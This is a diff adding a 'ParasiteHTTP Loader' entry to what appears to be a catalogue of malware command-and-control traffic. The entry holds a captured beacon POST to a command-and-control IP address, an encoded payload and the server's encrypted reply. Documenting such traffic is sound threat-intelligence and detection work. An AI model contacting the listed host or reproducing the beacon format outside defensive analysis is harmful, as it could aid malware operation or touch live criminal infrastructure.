@@ -895,6 +895,35 @@ X-Powered-By: PHP/5.4.45
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")
 
+#### ParasiteHTTP Loader
+~~~
+POST /index.php HTTP/1.1
+Accept: */*
+Host: 80.233.134.242
+Content-Type: application/x-www-form-urlencoded
+Connection: Close
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+Content-Length: 280
+Cache-Control: no-cache
+
+BF6472F6DC3=Pi5tSiBItP-2ZyuFJlr31Jp58O0HzR74v0b4l2HaoHH537FeTxgg-msYkTvX6SSJ8FswUtoTg4O86o2HyWec2zuU6VFzTwgaFYw_28nFRIqcJv8TqrV7SYgFKSpbqY8aZhEcHY982M_flvAHMCjsD8-fxezzV5BSBDBbfYb5WZvBrsbJVlPwXYFmETrm7CrWF5LwvEFhu1Ecp14ymv1xPoCG0vfqAv5tsUn0H7mA5R5g7HAo2c3_r9fuZUtw9CKD46G2JnBF-A==
+
+HTTP/1.1 200 OK
+Date: Tue, 28 May 2019 08:46:26 GMT
+Server: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.37
+X-Powered-By: PHP/5.6.37
+Set-Cookie: PHPSESSID=s3l4jdfsc8nkjghcevlshn3d67; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 416
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+8jQG4riRhJFWMlJ9RTKeV7k45+I3REM8JjIIBZ2ttxzjDFxOX7VjxuypIrJn9cQ1ZMg6fvgWSSpto3sivUfvUCHWLzb2ljPhPugPTYb0KsgResnAIFl+aoqF5m9bCyBd6PMoRLdOdsuDW+E3wrb7ZNpApXlX2htDZRNhaqfST8eBE9Cvl7H0vyUzY+BfH5M4fvvt71DCRt2OP31tgu7aMMxM0mUWvBBZcNpeZzLRdMFd0Ea1u3oM+vLWrhFLYGuCWN6TPaqlEpw/9pgLUI8BhxUYFOJvyTRIFwXmlQPWMY6qg0/l+b5Ha+SYCnLtw8Uyqilil+OBM+KM5MT4C4l9vkXsv/ID9X8ZRr2l9cHzlW5J7sLVrGeH26KmBrjqBM3c4Ini4VTZZCr5KDrsRpi21NaheQLGLA==
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/parasitehttp.png "ParasiteHTTP Loader")
+
 #### Pony Loader
 ~~~
 POST /eng/gate.php HTTP/1.0
